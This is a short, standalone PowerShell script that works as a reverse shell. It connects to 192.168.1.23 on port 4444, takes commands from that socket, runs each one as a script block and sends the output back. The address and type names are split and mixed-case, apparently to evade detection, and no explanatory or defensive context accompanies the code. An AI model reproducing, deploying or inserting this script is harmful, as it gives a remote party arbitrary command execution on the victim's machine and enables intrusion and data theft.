$v1 = "192"+".168"+".1."+"23"; $v2 = 4000+444; 
$T = New-Object "NeT.SOckEtS.TCPCliEnt"($v1,$v2);
$S = $T.GetStream();
$R = New-Object "IO.StreamReader"($S);
$W = New-Object "IO.StreamWriter"($S);
$W.AutoFlush = $true;
$B = New-Object "Byte[]" 1024;
while($T.Connected){
    while($S.DataAvailable){
        $RD = $S.Read($B,0,$B.Length);
        $C = ([Text.Encoding]::UTF8).GetString($B,0,$RD-1)
    };
    if($T.Connected -and $C.Length -gt 1){
        $O = try{&([ScriptBlock]::Create($C)) 2>&1}catch{$_};
        $W.WriteLine("$O");
        $C = $null
    }
};
$T.Close();$S.Close();$R.Close();$W.Close()